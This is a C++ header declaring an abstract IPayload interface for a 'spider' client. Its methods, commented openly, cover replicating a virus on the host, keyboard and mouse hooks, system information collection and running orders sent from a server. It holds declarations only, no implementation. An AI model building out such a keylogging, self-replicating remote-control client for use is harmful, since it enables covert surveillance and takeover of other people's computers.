#pragma once

#include <string>
#include "SystemInfo.h"
#include "SystemMsg.h"
#include "Queue.h"

#if defined __linux__ || defined __APPLE__
#define SPIDER_API
#else
#define SPIDER_API __declspec(dllexport)
#endif

namespace spider
{
  namespace client
  {
    namespace library
    {

#if defined   __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wweak-vtables"
#endif

      class IPayload
      {
      public:
	using Order = std::string;

	virtual ~IPayload() = default;

	// Should initialize the payload, if needed
	virtual bool init(mt::Queue<SystemMsg> &inputQueue) = 0;

	// Get the event thread-safe queue, in order to control the client
	virtual mt::Queue<Order> &getOrderQueue() = 0;

	// Respond to a ping from the server
	virtual void ping() = 0;

	// Get the message thread-safe queue, in order to response to the
	// server
	virtual mt::Queue<std::string> &getReponseQueue() = 0;

	// Replicate the virus on the host computer
	virtual void replicate() = 0;

	// Should de-initialize the payload, if needed
	virtual bool deinit() = 0;

	// Collect informations about the system
	virtual void getInfos() = 0;

	// Toggle Keyboard hook
	virtual bool getKeyboard() = 0;

	// Toggle Mouse hook
	virtual bool getMouse() = 0;

	// Kill the client
	virtual bool kill() = 0;

	// Execute all the actions needed
	virtual void run() = 0;

	// Execute an order received from the network
	virtual void exec(Order const &) = 0;
      };

#if defined   __clang__
#pragma clang diagnostic pop
#endif
    }
  }
}

extern "C" SPIDER_API spider::client::library::IPayload *getPayload();
